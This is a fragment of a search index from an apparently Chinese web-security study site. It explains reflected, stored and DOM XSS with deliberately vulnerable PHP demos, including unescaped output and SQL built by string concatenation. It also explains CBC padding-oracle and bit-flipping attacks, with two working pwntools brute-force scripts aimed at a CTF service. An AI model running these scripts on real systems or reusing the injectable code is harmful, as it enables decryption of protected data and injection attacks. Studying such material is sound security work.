object\u6587\u6863\u5bf9\u8c61\uff0c\u63a5\u7740\u751f\u6210\u5404\u4e2a\u5b50\u6587\u6863\u5bf9\u8c61\uff0c\u6bcf\u4e2a\u9875\u9762\u5143\u7d20\u5bf9\u5e94\u4e00\u4e2a\u6587\u6863\u5bf9\u8c61\uff0c\u6bcf\u4e2a\u6587\u6863\u5bf9\u8c61\u5305\u542b\u5c5e\u6027\u3001\u65b9\u6cd5\u548c\u4e8b\u4ef6\u3002\u53ef\u4ee5\u901a\u8fc7JS\u811a\u672c\u5bf9\u6587\u6863\u5bf9\u8c61\u8fdb\u884c\u7f16\u8f91\u4ece\u800c\u4fee\u6539\u9875\u9762\u7684\u5143\u7d20\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5ba2\u6237\u7aef\u7684\u811a\u672c\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7DOM\u6765\u52a8\u6001\u4fee\u6539\u9875\u9762\u5185\u5bb9\uff0c\u4ece\u5ba2\u6237\u7aef\u83b7\u53d6DOM\u4e2d\u7684\u6570\u636e\u5e76\u5728\u672c\u5730\u6267\u884c\u3002\u57fa\u4e8e\u8fd9\u4e2a\u7279\u6027\uff0c\u5c31\u53ef\u4ee5\u5229\u7528JS\u811a\u672c\u6765\u5b9e\u73b0XSS\u6f0f\u6d1e\u7684\u5229\u7528\u3002</p> <p>\u5173\u4e8eDOM\u578bXSS</p> <p>\u5b66\u53f7\uff1a16030140019 \u59d3\u540d: \u83ab\u76ca\u5f70 \u3010\u5d4c\u725b\u5bfc\u8bfb\u3011\uff1aDOM\uff0c\u5168\u79f0Document Object Model\uff0c\u662f\u4e00\u4e2a\u5e73\u53f0\u548c\u8bed\u8a00\u90fd\u4e2d\u7acb\u7684\u63a5\u53e3\uff0c\u53ef\u4ee5\u4f7f\u7a0b\u5e8f\u548c\u811a\u672c\u80fd\u591f\u52a8\u6001\u8bbf\u95ee...</p> <p>image.vnd.microsoft.icon</p> <p>[https://www.jianshu.com/p/190dedd585f2](</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#_5","title":"\u5229\u7528\u4e3e\u4f8b","text":""},{"location":"web/XSS_CSS_CSP/xss/XSS/#_6","title":"\u53cd\u5c04","text":"<p>\u7ed9\u51fa\u6e90\u7801</p> <pre><code>//\u524d\u7aef 1.html\uff1a\n&lt;html&gt;\n&lt;head lang=\"en\"&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;title&gt;\u53cd\u5c04\u578bXSS&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;form action=\"action.php\" method=\"post\"&gt;\n        &lt;input type=\"text\" name=\"name\" /&gt;\n        &lt;input type=\"submit\" value=\"\u63d0\u4ea4\"&gt;\n    &lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n//\u540e\u7aef action.php\uff1a\n&lt;?php\n    $name=$_POST[\"name\"]; \n    echo $name;\n?&gt;\nPlain Text\n</code></pre> <p>\u8fd9\u91cc\u6709\u4e00\u4e2a\u7528\u6237\u63d0\u4ea4\u7684\u9875\u9762\uff0c\u7528\u6237\u53ef\u4ee5\u5728\u6b64\u63d0\u4ea4\u6570\u636e\uff0c\u6570\u636e\u63d0\u4ea4\u4e4b\u540e\u7ed9\u540e\u53f0\u5904\u7406</p> <p></p> <p>\u6240\u4ee5\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u8f93\u5165\u6846\u4e2d\u63d0\u4ea4\u6570\u636e\uff1a\uff0c\u770b\u770b\u4f1a\u6709\u4ec0\u4e48\u53cd\u5e94</p> <p></p> <p>\u9875\u9762\u76f4\u63a5\u5f39\u51fa\u4e86hack\u7684\u9875\u9762\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u63d2\u5165\u7684\u8bed\u53e5\u5df2\u7ecf\u88ab\u9875\u9762\u7ed9\u6267\u884c\u4e86\u3002</p> <p>\u8fd9\u5c31\u662f\u6700\u57fa\u672c\u7684\u53cd\u5c04\u578b\u7684XSS\u6f0f\u6d1e\uff0c\u8fd9\u79cd\u6f0f\u6d1e\u6570\u636e\u6d41\u5411\u662f\uff1a\u524d\u7aef\u2192\u540e\u7aef\u2192\u524d\u7aef</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#_7","title":"\u5b58\u50a8","text":"<pre><code>//\u524d\u7aef\uff1a2.html\n&lt;html&gt;\n&lt;head lang=\"en\"&gt;\n&lt;meta charset=\"UTF-8\"&gt;\n&lt;title&gt;\u5b58\u50a8\u578bXSS&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;form action=\"action2.php\" method=\"post\"&gt;\n\u8f93\u5165\u4f60\u7684ID\uff1a  &lt;input type=\"text\" name=\"id\" /&gt; &lt;br/&gt;\n\u8f93\u5165\u4f60\u7684Name\uff1a&lt;input type=\"text\" name=\"name\" /&gt; &lt;br/&gt;\n&lt;input type=\"submit\" value=\"\u63d0\u4ea4\"&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n//\u540e\u7aef\uff1aaction2.php\n&lt;?php\n$id=$_POST[\"id\"];\n$name=$_POST[\"name\"];\nmysql_connect(\"localhost\",\"root\",\"root\");\nmysql_select_db(\"test\");\n\n$sql=\"insert into xss value ($id,'$name')\";\n$result=mysql_query($sql);\n?&gt;\n//\u4f9b\u5176\u4ed6\u7528\u6237\u8bbf\u95ee\u9875\u9762\uff1ashow2.php\n&lt;?php\nmysql_connect(\"localhost\",\"root\",\"root\");\nmysql_select_db(\"test\");\n$sql=\"select * from xss where id=1\";\n$result=mysql_query($sql);\nwhile($row=mysql_fetch_array($result)){\necho $row['name'];\n}\n?&gt;\nPlain Text\n</code></pre> <p>\u8fd9\u91cc\u6709\u4e00\u4e2a\u7528\u6237\u63d0\u4ea4\u7684\u9875\u9762\uff0c\u6570\u636e\u63d0\u4ea4\u7ed9\u540e\u7aef\u4e4b\u540e\uff0c\u540e\u7aef\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\u3002\u7136\u540e\u5f53\u5176\u4ed6\u7528\u6237\u8bbf\u95ee\u53e6\u4e00\u4e2a\u9875\u9762\u7684\u65f6\u5019\uff0c\u540e\u7aef\u8c03\u51fa\u8be5\u6570\u636e\uff0c\u663e\u793a\u7ed9\u53e6\u4e00\u4e2a\u7528\u6237\uff0cXSS\u4ee3\u7801\u5c31\u88ab\u6267\u884c\u4e86\u3002</p> <p></p> <p>\u6211\u4eec\u8f93\u51651\u548c\uff0c\u6ce8\u610f\uff0c\u8fd9\u91cc\u7684hack\u7684\u5355\u5f15\u53f7\u8981\u8fdb\u884c\u8f6c\u4e49\uff0c\u56e0\u4e3asql\u8bed\u53e5\u4e2d\u7684$name\u662f\u5355\u5f15\u53f7\u7684\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e0d\u8f6c\u4e49\u7684\u8bdd\u5c31\u4f1a\u95ed\u5408sql\u8bed\u53e5\u4e2d\u7684\u5355\u5f15\u53f7\u3002\u4e0d\u7136\u6ce8\u5165\u4e0d\u8fdb\u53bb\u3002\u63d0\u4ea4\u4e86\u4e4b\u540e\uff0c\u6211\u4eec\u770b\u770b\u6570\u636e\u5e93</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u7684XSS\u8bed\u53e5\u5df2\u7ecf\u63d2\u5165\u5230\u6570\u636e\u5e93\u4e2d\u4e86</p> <p>\u7136\u540e\u5f53\u5176\u4ed6\u7528\u6237\u8bbf\u95ee show2.php \u9875\u9762\u65f6\uff0c\u6211\u4eec\u63d2\u5165\u7684XSS\u4ee3\u7801\u5c31\u6267\u884c\u4e86\u3002</p> <p>\u5b58\u50a8\u578bXSS\u7684\u6570\u636e\u6d41\u5411\u662f\uff1a\u524d\u7aef\u2192\u540e\u7aef\u2192\u6570\u636e\u5e93\u2192\u540e\u7aef\u2192\u524d\u7aef</p> <p></p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#dom","title":"DOM","text":"<pre><code>// \u524d\u7aef3.html\n&lt;html&gt;\n&lt;head lang=\"en\"&gt;\n&lt;meta charset=\"UTF-8\"&gt;\n&lt;title&gt;DOM\u578bXSS&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;form action=\"action3.php\" method=\"post\"&gt;\n&lt;input type=\"text\" name=\"name\" /&gt;\n&lt;input type=\"submit\" value=\"\u63d0\u4ea4\"&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n// \u540e\u7aefaction3.php\n&lt;?php\n$name=$_POST[\"name\"];\n?&gt;\n&lt;input id=\"text\" type=\"text\" value=\"&lt;?php echo $name; ?&gt;\"/&gt;\n&lt;div id=\"print\"&gt;&lt;/div&gt;\n&lt;script type=\"text/javascript\"&gt;\nvar text=document.getElementById(\"text\");\nvar print=document.getElementById(\"print\");\nprint.innerHTML=text.value;  // \u83b7\u53d6 text\u7684\u503c\uff0c\u5e76\u4e14\u8f93\u51fa\u5728print\u5185\u3002\u8fd9\u91cc\u662f\u5bfc\u81f4xss\u7684\u4e3b\u8981\u539f\u56e0\u3002\n&lt;/script&gt;\nPlain Text\n</code></pre> <p>\u8fd9\u91cc\u6709\u4e00\u4e2a\u7528\u6237\u63d0\u4ea4\u7684\u9875\u9762\uff0c\u7528\u6237\u53ef\u4ee5\u5728\u6b64\u63d0\u4ea4\u6570\u636e\uff0c\u6570\u636e\u63d0\u4ea4\u4e4b\u540e\u7ed9\u540e\u53f0\u5904\u7406</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u8f93\u5165\uff0c\u7136\u540e\u770b\u770b\u9875\u9762\u7684\u53d8\u5316</p> <p></p> <p>\u9875\u9762\u76f4\u63a5\u5f39\u51fa\u4e86 hack \u7684\u9875\u9762\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u63d2\u5165\u7684\u8bed\u53e5\u5df2\u7ecf\u88ab\u9875\u9762\u7ed9\u6267\u884c\u4e86\u3002</p> <p>\u8fd9\u5c31\u662fDOM\u578bXSS\u6f0f\u6d1e\uff0c\u8fd9\u79cd\u6f0f\u6d1e\u6570\u636e\u6d41\u5411\u662f\uff1a\u524d\u7aef\u2192\u6d4f\u89c8\u5668</p> <p>\u5f00\u62d3\u4e00\u4e0b\u8111\u6d1e\uff1aDOM\u578b\u7c7b\u6bd4\u4e00\u4e2a\u89e3\u6790\u6a21\u677f\uff0c\u4f60\u8f93\u5165\u6570\u636e\u76f4\u63a5\u7ed9\u4f60\u89e3\u6790\u4e86\u3002</p>"},{"location":"web/crypto/CBC_Padding_Oracle%E6%94%BB%E5%87%BB/","title":"CBC Padding Oracle\u653b\u51fb","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u539f\u6587\uff1a</p> <p>https://blog.csdn.net/weixin_44843084/article/details/106736385Padding</p> <p>Oracle Attack\u80cc\u540e\u7684\u5173\u952e\u6027\u6982\u5ff5\u4fbf\u662f\u52a0/\u89e3\u5bc6\u65f6\u7684\u586b\u5145\uff08Padding\uff09\u3002\u660e\u6587\u4fe1\u606f\u53ef\u4ee5\u662f\u4efb\u610f\u957f\u5ea6\uff0c\u4f46\u662f\u5757\u72b6\u52a0\u5bc6\u7b97\u6cd5\u9700\u8981\u6240\u6709\u7684\u4fe1\u606f\u90fd\u7531\u4e00\u5b9a\u6570\u91cf\u7684\u6570\u636e\u5757\u7ec4\u6210\u3002\u4e3a\u4e86\u6ee1\u8db3\u8fd9\u6837\u7684\u9700\u6c42\uff0c\u4fbf\u9700\u8981\u5bf9\u660e\u6587\u8fdb\u884c\u586b\u5145\uff0c\u8fd9\u6837\u4fbf\u53ef\u4ee5\u5c06\u5b83\u5206\u5272\u4e3a\u5b8c\u6574\u7684\u6570\u636e\u5757\u3002</p> <p>\u52a0\u5bc6\u65f6\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u586b\u5145\u89c4\u5219\uff0c\u4f46\u6700\u5e38\u89c1\u7684\u586b\u5145\u65b9\u5f0f\u4e4b\u4e00\u662f\u5728PKCS#5\u6807\u51c6\u4e2d\u5b9a\u4e49\u7684\u89c4\u5219\u3002PCKS#5\u7684\u586b\u5145\u65b9\u5f0f\u4e3a\uff1a\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u6570\u636e\u5757\u5305\u542bN\u4e2a\u5b57\u8282\u7684\u586b\u5145\u6570\u636e\uff08N\u53d6\u51b3\u4e8e\u660e\u6587\u6700\u540e\u4e00\u5757\u7684\u6570\u636e\u957f\u5ea6\uff09\u3002\u4e0b\u56fe\u662f\u4e00\u4e9b\u793a\u4f8b\uff0c\u5c55\u793a\u4e86\u4e0d\u540c\u957f\u5ea6\u7684\u5355\u8bcd\uff08FIG\u3001BANANA\u3001AVOCADO\u3001PLANTAIN\u3001PASSIONFRUIT\uff09\u4ee5\u53ca\u5b83\u4eec\u4f7f\u7528PKCS#5\u586b\u5145\u540e\u7684\u7ed3\u679c\uff08\u6bcf\u4e2a\u6570\u636e\u5757\u4e3a8\u5b57\u8282\u957f\uff09\u3002\u5982\u679c\u89e3\u5bc6\u540e\u7684\u6700\u540e\u4e00\u4e2a\u6570\u636e\u5757\u672b\u5c3e\u5e76\u975e\u8fd9\u4e9b\u5408\u6cd5\u7684\u5b57\u8282\u5e8f\u5217\uff0c\u5927\u90e8\u5206\u52a0/\u89e3\u5bc6\u7a0b\u5e8f\u90fd\u4f1a\u629b\u51fa\u4e00\u4e2a\u586b\u5145\u5f02\u5e38\u3002\u8fd9\u4e2a\u5f02\u5e38\u5bf9\u4e8e\u653b\u51fb\u8005\u5c24\u4e3a\u5173\u952e\uff0c\u5b83\u662fPaddingOracle Attack\u7684\u57fa\u7840\u3002</p> <p>\u4e4b\u540e\u5173\u4e8e\u6f0f\u6d1e\u90e8\u5206\u53c2\u8003\u6587\u7ae0\uff1ahttps://www.freebuf.com/articles/web/15504.html</p> <p>https://www.jianshu.com/p/ad8bdd87e131</p>"},{"location":"web/crypto/CBC_Padding_Oracle%E6%94%BB%E5%87%BB/#_1","title":"\u539f\u7406","text":"<p>\u8fd9\u91cc\u7b80\u5355\u7684\u7a0d\u5fae\u9610\u8ff0\uff1a</p> <p>CBC(Cipher Block Chaining CBC)\u6a21\u5f0f</p> <p>\u8fd9\u662f\u4e00\u79cd\u5206\u7ec4\u94fe\u63a5\u6a21\u5f0f\uff0c\u76ee\u7684\u662f\u4e3a\u4e86\u4f7f\u539f\u672c\u72ec\u7acb\u7684\u5206\u7ec4\u5bc6\u7801\u52a0\u5bc6\u8fc7\u7a0b\u5f62\u6210\u8fed\u4ee3\uff0c\u4f7f\u6bcf\u6b21\u52a0\u5bc6\u7684\u7ed3\u679c\u5f71\u54cd\u5230\u4e0b\u4e00\u6b21\u52a0\u5bc6\u3002\u8fd9\u884c\u53ef\u4ee5\u5f3a\u5316\u52a0\u5bc6\u7b97\u6cd5\u7684\"\u654f\u611f\u6027\"\uff0c\u5373\u5b9e\u73b0\u6240\u8c13\u7684\"\u96ea\u5d29\u6548\u5e94\"\uff0c\u5728\u9999\u6d53\u7406\u8bba\u4e2d\u8fd9\u5c31\u662f\"\u6270\u4e71\u539f\u5219\"\u3002</p> <p>\u524d\u51e0\u4e2a\u5206\u7ec4\u7684\u89e3\u5bc6\u7ed3\u679c\u5bf9\u6211\u4eec\u90fd\u6ca1\u6709\u610f\u4e49\uff0c\u6211\u4eec\u91cd\u70b9\u5173\u6ce8\u7684\u662f\u6700\u540e\u4e00\u4e2a\u5206\u7ec4\u7684\u89e3\u5bc6\u7ed3\u679c\u3002\u770b\u8fd9\u5f20\u56fe\u53ef\u80fd\u4f1a\u6e05\u695a\u4e00\u70b9:</p> <p></p> <p>\u5728PaddingOracle Attack\u653b\u51fb\u4e2d\uff0c\u653b\u51fb\u8005\u8f93\u5165\u7684\u53c2\u6570\u662fIV+Cipher\uff0c\u6211\u4eec\u8981\u901a\u8fc7\u5bf9IV\u7684\"\u7a77\u4e3e\"\u6765\u8bf7\u6c42\u670d\u52a1\u5668\u7aef\u5bf9\u6211\u4eec\u6307\u5b9a\u7684Cipher\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u5bf9\u8fd4\u56de\u7684\u7ed3\u679c\u8fdb\u884c\u5224\u65ad\u3002</p> <ol> <li> <p>\u653b\u51fb\u8005\u80fd\u591f\u83b7\u5f97\u5bc6\u6587\uff08Ciphertext\uff09\uff0c\u4ee5\u53ca\u9644\u5e26\u5728\u5bc6\u6587\u524d\u9762\u7684IV\uff08\u521d\u59cb\u5316\u5411\u91cf\uff09</p> </li> <li> <p>\u653b\u51fb\u8005\u80fd\u591f\u89e6\u53d1\u5bc6\u6587\u7684\u89e3\u5bc6\u8fc7\u7a0b\uff0c\u4e14\u80fd\u591f\u77e5\u9053\u5bc6\u6587\u7684\u89e3\u5bc6\u7ed3\u679c</p> </li> </ol> <p>\u4e0eCBC\u7ffb\u8f6c\u653b\u51fb\u4e0d\u540c\u7684\u5730\u65b9\u662f\u6211\u4eec\u8fd9\u91cc\u4e0d\u77e5\u9053\u89e3\u5bc6\u4e4b\u540e\u7684\u660e\u6587\uff0c\u53ea\u77e5\u9053\u5e76\u53ef\u63a7IV\u548c\u5bc6\u6587\uff0c\u5bf9\u4e86 \u8fd8\u6709\u89e3\u5bc6\u662f\u5426\u6210\u529f</p> <p>\u89e3\u5bc6\u662f\u5426\u6210\u529f\u8fd9\u4e2a\u70b9\u6210\u4e3a\u4e86padding oracle\u653b\u51fb\u81f3\u5173\u91cd\u8981\u7684\u4e00\u70b9\uff0c</p> <p>\u56e0\u4e3a\u6211\u4eec\u77e5\u9053padding\u53ea\u80fd\u4e3a\uff1a</p> <p>data0x01 \u6216</p> <p>data0x02 0x02 \u6216</p> <p>data0x03 0x03 0x03 \u6216</p> <p>data0x04 0x04 0x04 0x04 \u6216</p> <p>data0x05 0x05 0x05 0x05 0x05 \u6216</p> <p>......</p> <p>\u90a3\u5982\u679c\u51fa\u73b0\u4ee5\u4e0b\u8fd9\u79cdpadding\u7684\u65f6\u5019\u4f1a\u600e\u4e48\u6837\u5462\uff1f</p> <p>data0x05 0x05</p> <p>\uff08\u6b63\u5e38\u6765\u8bf4\u8fd9\u4e2apadding\u5e94\u4e3adata 0x05 0x05 0x05 0x05 0x05\uff09</p> <p>\u90a3\u89e3\u5bc6\u4e4b\u540e\u7684\u68c0\u9a8c\u5c31\u4f1a\u51fa\u73b0\u9519\u8bef\uff0c\u56e0\u4e3apadding\u7684\u4f4d\u6570\u548cpadding\u5185\u5bb9\u4e0d\u4e00\u81f4</p> <p>\u5982\u679c\u8fd9\u4e2a\u670d\u52a1\u6ca1\u6709catch\u8fd9\u4e2a\u9519\u8bef\u7684\u8bdd\u90a3\u4e48\u7a0b\u5e8f\u5c31\u4f1a\u4e2d\u9014\u62a5\u9519\u9000\u51fa\uff0c\u8868\u73b0\u4e3a\uff0c\u5982http\u670d\u52a1\u7684status code\u4e3a500.</p>"},{"location":"web/crypto/CBC_Padding_Oracle%E6%94%BB%E5%87%BB/#_2","title":"CBC Padding Oracle\u653b\u51fb","text":"<p>\u7406\u89e3\u8fd9\u91cc\u7684\u5173\u952e\u5728\u4e8e\u610f\u8bc6\u5230\u670d\u52a1\u5668\u62e5\u6709\u7684\u662f\u6211\u4eec\u63d0\u4ea4\u8fc7\u7a0b\u4e2d\u7684\u4e2d\u95f4\u503c\uff0c\u5b83\u53ea\u7ed9\u4e0e\u5f62\u5f0f\u4e0a\u7684\u5224\u65ad\u800c\u4e0d\u4f1a\u53bb\u4e0e\u660e\u6587\u4e0e\u8fdb\u884c\u6b63\u786e\u4e0e\u5426\u7684\u5339\u914d\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u7b2c\u4e00\u6b21\uff0c\u6211\u4eec\u63d0\u4ea4\uff08xxxxxxx0x\uff0800--ff\uff09\uff09\u53ea\u6709\u6700\u540e\u4e00\u4f4d\u7684\u6570\u503c\uff0c\u8fd9\u65f6\u5019\uff0c\u7531\u4e8e0x01\u20140x08\u5728\u660e\u6587\u4e2d\u4e0d\u53ef\u80fd\u51fa\u73b0\uff0c\u56e0\u6b64\uff0c\u76f8\u5f53\u4e8e\u5f02\u6216\u540e\u7684\u4f2a\u660e\u6587\u4e3azzzzzzzzzzzzz0x01\u8fd9\u65f6\u5019\u53ef\u4ee5\u5f97\u5230\u6211\u4eec\u5229\u7528\u6700\u540e\u4e00\u7ec4\u5bc6\u6587\u7ecf\u8fc7des\u6216aes\u52a0\u5bc6\u5f97\u5230\u7684\u4e2d\u95f4\u503c\uff0c\u6700\u540e\u5c06\u8be5\u4e2d\u95f4\u503c\u4e0e\u5bc6\u94a5\u76f8\u5e94\u7684\u4f4d\u505a\u5f02\u6216\u5373\u53ef\uff0c\u90a3\u4e48\u4e4b\u540e\u6211\u4eec\u9700\u8981\u5f97\u5230\u7684\u662f\u5012\u6570\u7b2c\u4e8c\u4f4d\uff0c\u6b64\u65f6\u4f2a\u660e\u6587\u5e94\u8be5\u4e3azzzzzzzzz0x02 0x02\uff0c\u7531\u4e8e\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e2d\u95f4\u503c\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u90a3\u4e48\u6211\u4eec\u63d0\u4ea4\u7684IV\u503c\u6700\u540e\u4e00\u4f4d\u5e94\u8be5\u6ee1=0x02^\u4e2d\u95f4\u503c\u6700\u540e\u4e00\u4f4d\uff0c\u4e4b\u540e\u7531\u540c\u6837\u7684\u65b9\u6cd5\u53ef\u4ee5\u63a8\u51fa\u7206\u7834\u5012\u6570\u7b2c\u4e8c\u4f4d\u7684\u503c\uff0c\u6211\u4eec\u6bcf\u6b21\u63a8\u76f8\u5f53\u4e8e\u5f97\u5230\u7684\u662f\u4e2d\u95f4\u503c\uff0c\u4e14\u6bcf\u6b21\u4fdd\u6301\u4e00\u4f4d\u6765\u8fdb\u884c\u771f\u6216\u5047\u7684\u7206\u7834\u3002</p>"},{"location":"web/crypto/CBC_Padding_Oracle%E6%94%BB%E5%87%BB/#_3","title":"\u653b\u51fb\u811a\u672c","text":"<p>\u548csql\u6ce8\u5165\u7684\u811a\u672c\u5f88\u7c7b\u4f3c\uff0c\u90fd\u662f\u731c\u6d4b\uff0c\u7136\u540e\u4ece\u670d\u52a1\u5668\u7ed9\u6211\u4eec\u7684\u4e00\u4e2abool\u5224\u65ad</p> <p>\u770b\u5f97\u61c2sql\u6ce8\u5165\u5c31\u4e00\u5b9a\u80fd\u770b\u7684\u61c2\u7f62\uff08\u65e0\u6148\u60b2\u8bf7\uff09\uff1a</p> <pre><code>from pwn import *\nimport base64 as b64\n\nIV = ['\\x00'] * 16\nsecret = 'nPQctp6AezY8BcGPjlYW8Pv+Fpo15LeatsVbj47jqgE='\nsecret1 = b64.b64decode(secret)[0:16]\nsecret2 = b64.b64decode(secret)[16:]\np = remote('10.188.2.20',10010)\nmiddle = []\npt = ''\n\nfor x in xrange(0,16):\n    for y in xrange(0,256):\n        p.recvuntil(\"Give your option:\\n\")\n        p.sendline('3')\n        p.recvuntil(\"IV:\\n\")\n        p.sendline(b64.b64encode(''.join(IV))) #send your IV\n        p.recvuntil(\"Data:\\n\")\n        p.sendline(b64.b64encode(secret1)) #send your Data\n        # p.sendline(b64.b64encode(secret2)) #send your Data\n        res = p.recvuntil(\"\\n\")\n        # print res\n        if 'bad decrypt' in res:\n            IV[15-x] = chr(y)\n        elif 'Decrpytion Done' in res:\n            print IV\n            IV[15-x] = chr(ord(IV[15-x]) ^ (x + 1)) #to get the correct middle, just like ---&gt; IV[0] ^ 0x01 = middle[0]\n            middle.append(ord(IV[15-x])) #store the correct middle\n            print middle\n            pt += chr(ord(IV[15-x]) ^ ord('A')) #first plaint text\n            # pt += chr(ord(IV[15-x]) ^ ord(secret1[15-x])) #second plaint text\n            for z in xrange(0,x + 1):\n                IV[15-z] = chr(middle[z] ^ (x + 2)) #generate the next new IV\n            break\n        else:\n            print res\n            exit()\n        if y == 255:\n            print '[!] Something wrong'\n            print x + 1\n            exit()\n\nprint '[!] Final IV : '\nprint IV\nprint '[!] Get middle : ', middle\nprint '[!] PlaintText is : ' + pt[::-1]\n\n#######################################################################\n\n2\uff1a\nfrom pwn import *\nimport base64 as b64\n\nsecret = 'nPQctp6AezY8BcGPjlYW8Pv+Fpo15LeatsVbj47jqgE='\nsecret1 = b64.b64decode(secret)[0:16]\nsecret2 = b64.b64decode(secret)[16:]\np = remote('10.188.2.20',10010)\n\nmiddle = []\npadding = ''\n\nfor x in xrange(1,17):\n    for y in xrange(0,256):\n        IV = \"\\x00\" * (16-x) + chr(y) + padding\n\n        p.recvuntil(\"Give your option:\\n\")\n        p.sendline(\"3\")\n\n        p.recvuntil(\"IV:\\n\")\n        p.sendline(b64.b64encode(IV))\n\n        p.recvuntil(\"Data:\\n\")\n        p.sendline(b64.b64encode(secret2))\n\n        res = p.recvuntil(\"\\n\")\n        if 'Decrpytion Done' in res:\n            middle.append(y ^ x) #calculate and store the correct middle\n            print middle\n            padding = ''\n            for z in middle:\n                padding = chr((x+1) ^ z) + padding #generate the next new IV tail\n            break\n\nflag = \"\"\nfor x,y in zip(middle,secret1[::-1]):\n    # flag += chr(x ^ ord('A')) #for secret1\n    flag += chr(x ^ ord(y)) #for secret2\nprint flag[::-1]\n</code></pre>"},{"location":"web/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/","title":"CBC\u5b57\u8282\u7ffb\u8f6c\u653b\u51fb","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u7ffb\u8f6c\u5b57\u8282\u653b\u51fb\u5e94\u8be5\u4f1a\u78b0\u5230\u86ee\u591a</p> <p>\u662fCBC Padding Oracle\u7684\u57fa\u7840\u90e8\u5206\uff0c\u5efa\u8bae\u5148\u7406\u89e3\u6e05\u695a\u8fd9\u4e2a\u518d\u53bb\u5b66\u4e60padding oracle</p>"},{"location":"web/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/#feistel","title":"Feistel\u6846\u67b6","text":"<p>\u9996\u5148\u9700\u8981\u4ecb\u7ecd\u7684\u662f\u8fd9\u4e2a\u540d\u4e3a\uff26\uff45\uff49\uff53\uff54\uff45\uff4c\u7684\u6846\u67b6</p> <p></p> <p>\u6211\u4eec\u4e0d\u9700\u8981\u8ba4\u6e05\u695aDES\u4e4b\u4e2d\u7684S\u76d2\u4e2d\uff08\u751f\u6210\u5bc6\u94a5\u65f6\u6240\u4f7f\u7528\uff09\u7684\u52a0\u5bc6\u7b97\u6cd5</p> <p>\u53ea\u9700\u8981\u6e05\u695a\u4e00\u4e0b\u6d41\u7a0b\uff0c\u7406\u89e3\u8fd9\u4e2a\u5f02\u6216\u5373\u53ef</p> <p>\u8fd9\u4e48\u7406\u89e3</p> <p>\u9996\u5148\u7ed9\u51fa\u660e\u6587\u548c\u5bc6\u94a5</p> <p>\u7136\u540e\u52a0\u5bc6</p> <p>\u52a0\u5bc6\u6d41\u7a0b\u662f\u8fd9\u6837\u7684</p> <p>\u660e\u6587\u7684\u53f3\u534a\u90e8\u5206\u4f5c\u4e3a\u4e0b\u4e00\u7ea7\u52a0\u5bc6\u660e\u6587\u7684\u5de6\u534a\u90e8\u5206</p> <p>\u53f3\u534a\u90e8\u5206\u518d\u548c\u5bc6\u94a5F\uff08F\u6307\u67d0\u9879\u64cd\u4f5c\uff0c\u53ef\u4ee5\u7406\u89e3\u6210\u67d0\u4e2a\u51fd\u6570\uff09\u4e4b\u540e\uff0c\u5c06\u7ed3\u679c\u548c\u5de6\u534a\u90e8\u5206\u5f02\u6216\u4f5c\u4e3a\u4e0b\u4e00\u7ea7\u52a0\u5bc6\u660e\u6587\u7684\u53f3\u534a\u90e8\u5206\uff0c\u5faa\u73af16\u6b21\uff08\u4e00\u822c\u662f16\u6b21\uff09\u3002</p>"},{"location":"web/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/#_1","title":"\u653b\u51fb\u59ff\u52bf","text":"<p>CBC\u6a21\u5f0f\u7684\u5168\u79f0\u662fCipher Block Chaining\u6a21\u5f0f\uff08\u5bc6\u6587\u5206\u7ec4\u94fe\u63a5\u6a21\u5f0f\uff09\uff0c\u4e4b\u6240\u4ee5\u53eb\u8fd9\u4e2a\u540d\u5b57\uff0c\u662f\u56e0\u4e3a\u5bc6\u6587\u5206\u7ec4\u50cf\u94fe\u6761\u4e00\u6837\u76f8\u4e92\u8fde\u63a5\u5728\u4e00\u8d77\u3002</p> <p>\u5728CBC\u6a21\u5f0f\u4e2d\uff0c\u9996\u5148\u5c06\u660e\u6587\u5206\u7ec4\u4e0e\u524d\u4e00\u4e2a\u5bc6\u6587\u5206\u7ec4\u8fdb\u884cXOR\u8fd0\u7b97\uff0c\u7136\u540e\u518d\u8fdb\u884c\u52a0\u5bc6\u3002(\u4e2a\u4eba\u611f\u89c9\u662f\u5f88\u50cfDES\u52a0\u5bc6\u7684\u6d41\u7a0b)</p> <p>\u796d\u51fa\u8fd9\u5f20\u56fe\uff08\u5c31\u662f\u524d\u9762\u5c06\u5f97\u5230Feistel\u6846\u67b6\uff09</p> 